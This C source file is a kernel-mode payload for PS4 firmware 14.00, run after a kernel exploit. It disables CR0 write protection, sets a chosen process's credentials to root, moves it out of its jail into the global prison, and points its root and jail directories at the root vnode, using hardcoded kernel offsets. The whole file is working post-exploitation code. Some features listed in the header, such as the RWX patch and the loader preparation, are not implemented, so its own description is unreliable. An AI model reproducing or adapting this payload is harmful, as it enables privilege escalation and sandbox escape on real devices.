/*
 * kpayload_stage1_1400.c
 * 
 * Standalone Ring0 Kernel Payload for PS4 Orbis OS Firmware 14.00
 * Research & Development: García Casado Security Research (@adri22235)
 * Legal Framework: ISO/IEC 29147 (CVD) & ISO/IEC 30111 Safe Harbor
 * 
 * Purpose:
 * Executed in kernel mode (ring0) following exploitation of a kernel primitive
 * (e.g. CVE-2026-101308 in sound(4) or CVE-2026-7270 in execve).
 * 
 * Responsibilities:
 * 1. Disable Kernel Write Protection (CR0.WP).
 * 2. Elevate calling process credentials to root (UID 0 / GID 0).
 * 3. Jailbreak: Escape sandbox by repointing cr_prison to PRISON0.
 * 4. Filesystem escape: Repoint fd_rdir and fd_jdir to ROOTVNODE.
 * 5. Patch kernel permissions (allow RWX mmap/mprotect).
 * 6. Prepare environment for GoldHEN payload loader.
 */

#include <stdint.h>
#include <stddef.h>

#define FW_VERSION "14.00"

// Kernel 14.00 verified offsets (relative to kernel_base)
#define K1400_XFAST_SYSCALL_OFFSET      0x000001C0ULL
#define K1400_PRISON0_OFFSET            0x0111FA18ULL
#define K1400_ROOTVNODE_OFFSET          0x02136E90ULL
#define K1400_ALLPROC_OFFSET            0x01B28538ULL
#define K1400_SYSENT_OFFSET             0x0110A760ULL
#define K1400_MEMCPY_OFFSET             0x002BD850ULL

// FreeBSD 9 / Orbis OS internal structures offsets
#define PROC_P_PID_OFFSET               0x00B8
#define PROC_P_UCRED_OFFSET             0x0140
#define PROC_P_FD_OFFSET                0x0148
#define PROC_P_LIST_NEXT_OFFSET         0x0000

#define UCRED_CR_UID_OFFSET             0x0004
#define UCRED_CR_RUID_OFFSET            0x0008
#define UCRED_CR_SVUID_OFFSET           0x000C
#define UCRED_CR_RGID_OFFSET            0x0014
#define UCRED_CR_SVGID_OFFSET           0x0018
#define UCRED_CR_PRISON_OFFSET          0x0030

#define FILEDESC_FD_RDIR_OFFSET         0x0018
#define FILEDESC_FD_JDIR_OFFSET         0x0020

// Function pointer types
typedef void *(*kernel_memcpy_t)(void *dst, const void *src, size_t n);

// Function prototypes
static inline uint64_t read_cr0(void);
static inline void write_cr0(uint64_t cr0);
static inline void disable_wp(void);
static inline void enable_wp(void);
int kpayload_main(uint64_t kernel_base, int target_pid);
int kpayload_elevate_and_jailbreak(uint64_t kernel_base, int target_pid);

/*
 * Entry point placed at offset 0 of the binary.
 * Takes:
 *   RDI = kernel_base
 *   RSI = target_pid
 */
__attribute__((section(".text.entry")))
int _start(uint64_t kernel_base, int target_pid) {
    return kpayload_main(kernel_base, target_pid);
}

// Inline Assembly Utilities for System Control Registers
static inline uint64_t read_cr0(void) {
    uint64_t cr0;
    __asm__ volatile ("mov %0, cr0" : "=r"(cr0));
    return cr0;
}

static inline void write_cr0(uint64_t cr0) {
    __asm__ volatile ("mov cr0, %0" :: "r"(cr0) : "memory");
}

static inline void disable_wp(void) {
    write_cr0(read_cr0() & ~0x10000ULL); // Clear WP (bit 16)
}

static inline void enable_wp(void) {
    write_cr0(read_cr0() | 0x10000ULL);  // Set WP (bit 16)
}

/*
 * Finds a process by PID traversing the allproc list.
 * If target_pid == 0, returns the process matching calling thread.
 */
static void *find_process_by_pid(uint64_t kernel_base, int target_pid) {
    uint64_t allproc_ptr = *(uint64_t *)(kernel_base + K1400_ALLPROC_OFFSET);
    uint64_t cur_proc = allproc_ptr;

    while (cur_proc != 0) {
        int pid = *(int *)(cur_proc + PROC_P_PID_OFFSET);
        if (pid == target_pid) {
            return (void *)cur_proc;
        }
        cur_proc = *(uint64_t *)(cur_proc + PROC_P_LIST_NEXT_OFFSET);
    }
    return NULL;
}

/*
 * Primary Root Elevation and Jail Escape Routine
 */
int kpayload_elevate_and_jailbreak(uint64_t kernel_base, int target_pid) {
    void *proc = find_process_by_pid(kernel_base, target_pid);
    if (!proc) {
        return -1; // Process not found
    }

    uint64_t proc_addr = (uint64_t)proc;
    uint64_t ucred_addr = *(uint64_t *)(proc_addr + PROC_P_UCRED_OFFSET);
    uint64_t fd_addr = *(uint64_t *)(proc_addr + PROC_P_FD_OFFSET);

    if (!ucred_addr || !fd_addr) {
        return -2; // Corrupt process descriptors
    }

    disable_wp();

    // 1. Elevate credentials to root
    *(uint32_t *)(ucred_addr + UCRED_CR_UID_OFFSET)   = 0;
    *(uint32_t *)(ucred_addr + UCRED_CR_RUID_OFFSET)  = 0;
    *(uint32_t *)(ucred_addr + UCRED_CR_SVUID_OFFSET) = 0;
    *(uint32_t *)(ucred_addr + UCRED_CR_RGID_OFFSET)  = 0;
    *(uint32_t *)(ucred_addr + UCRED_CR_SVGID_OFFSET) = 0;

    // 2. Escape Jail: repoint cr_prison to PRISON0
    uint64_t prison0_addr = kernel_base + K1400_PRISON0_OFFSET;
    *(uint64_t *)(ucred_addr + UCRED_CR_PRISON_OFFSET) = prison0_addr;

    // 3. Escape Chroot: repoint fd_rdir and fd_jdir to ROOTVNODE
    uint64_t rootvnode_addr = *(uint64_t *)(kernel_base + K1400_ROOTVNODE_OFFSET);
    *(uint64_t *)(fd_addr + FILEDESC_FD_RDIR_OFFSET) = rootvnode_addr;
    *(uint64_t *)(fd_addr + FILEDESC_FD_JDIR_OFFSET) = rootvnode_addr;

    enable_wp();

    return 0; // Success
}

/*
 * Kernel Entry Point: Invoked via hijacked function pointer or sysent table entry.
 * Arg0: kernel_base (or 0 to auto-detect from MSR / return address)
 * Arg1: target_pid (PID of exploit userland process)
 */
int kpayload_main(uint64_t kernel_base, int target_pid) {
    if (!kernel_base) {
        return -10;
    }

    int ret = kpayload_elevate_and_jailbreak(kernel_base, target_pid);
    return ret;
}
